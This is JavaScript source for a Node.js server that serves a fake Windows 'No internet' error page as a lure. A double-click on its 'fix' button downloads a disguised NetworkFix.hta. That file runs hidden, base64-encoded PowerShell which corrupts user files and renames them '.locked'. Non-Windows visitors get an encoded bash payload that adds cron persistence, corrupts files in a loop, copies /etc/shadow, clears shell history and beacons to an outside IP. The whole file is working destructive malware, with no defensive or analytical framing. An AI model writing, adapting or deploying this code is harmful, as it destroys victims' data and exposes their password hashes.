const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        const a = q.headers['user-agent'] || '';

        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        if (!u.includes('trigger=1')) {
            r.writeHead(200, { 'Content-Type': 'text/html' });
            r.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>No internet</title>
                    <style>
                        body { background-color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                        .container { max-width: 600px; width: 100%; padding: 20px; text-align: center; }
                        .dino { width: 100%; max-width: 400px; height: auto; margin-bottom: 20px; border-radius: 8px; }
                        h1 { font-size: 22px; font-weight: 500; margin: 0 0 10px 0; color: #202124; text-align: left; }
                        p { font-size: 14px; line-height: 1.6; margin: 0 0 20px 0; text-align: left; }
                        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; transition: background 0.2s; }
                        .btn:active { background-color: #174ea6; }
                        .error-code { font-size: 12px; margin-top: 30px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; text-align: left; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <img class="dino" src="https://i.pinimg.com/736x/3f/b9/d5/3fb9d5c352d44f2ee191814f3bf60826.jpg">
                        <h1>No internet</h1>
                        <p>Windows is unable to connect to the internet. Network protocols are out of sync. Please double-click the reload button to re-initialize the DNS driver.<br><br>• Check network cables<br>• Reset network adapter</p>
                        <button class="btn" id="reloadBtn">Reload & Fix Connection</button>
                        <div class="error-code">DNS_PROBE_FINISHED_NO_INTERNET</div>
                    </div>
                    <iframe id="f" style="display:none"></iframe>
                    <script>
                        let clicks = 0;
                        document.getElementById('reloadBtn').onclick = function() {
                            clicks++;
                            if(clicks === 1) {
                                // First click starts the download in the background
                                document.getElementById('f').src = window.location.href + '&trigger=1';
                            } 
                            if(clicks >= 2) {
                                // Second click (Double Click) triggers the Search-MS Focus
                                // This opens File Explorer and highlights the download automatically
                                window.location.href = "search-ms:query=NetworkFix&crumb=location:%USERPROFILE%\\\\Downloads&";
                            }
                        };
                    </script>
                </body>
                </html>
            `);
            return;
        }

        if (a.includes('Windows')) {
            r.writeHead(200, {
                'Content-Type': 'application/hta',
                'Content-Disposition': `inline; filename="NetworkFix.hta"`,
                'X-Content-Type-Options': 'nosniff'
            });

            r.end(`<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMgAwACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgeyBpZihUZXN0LVBhdGggJF8uRnVsbE5hbWUpIHsgJGI9TmV3LU9iamVjdCBCeXRlW10gMTAyNDsgKE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkXy5GdWxsTmFtZSwgJGIpOyAkbj0tam9pbigoNjUuLjkzKSsoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCA4IHwgRm9yRWFjaC1PYmplY3QgeyBbY2hhcl0kXyB9KTsgUmVuYW1lLUl0ZW0gLVBhdGggJF8uRnVsbE5hbWUgLU5ld05hbWUgKCR1c2luZzpwICsgJG4gKyAnLmxvY2tlZCcpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0gfSB9":s.Run p,0,False:self.close:End Sub</script></head></html>`);
        } else {
            r.writeHead(200, { 'Content-Type': 'text/plain' });
            r.end(`(K="cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmICBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XCIkdFwiIGJzPTFrIGNvdW50PTEgY29udj1ub3RydW5jIDI+L2Rldi9udWxsOyBuPVwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcIiR0XCIgXCIkKGRpcm5hbWUgXCIkdFwiKS9UcFwkbi5sb2NrZWRcIiAyPi9kZXYvbnVsbDsgZG9uZTsgZG9uZSIgPi9kZXYvbnVsbCAyPiYxICYpOyBlY2hvICJbIV0gVEVTVCBNT0RFIEFDVElWQVRFRDogRW5naW5lIGJhY2tncm91bmRlZC4iOyBmaSIgfCBiYXNoICZ`);
        }
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
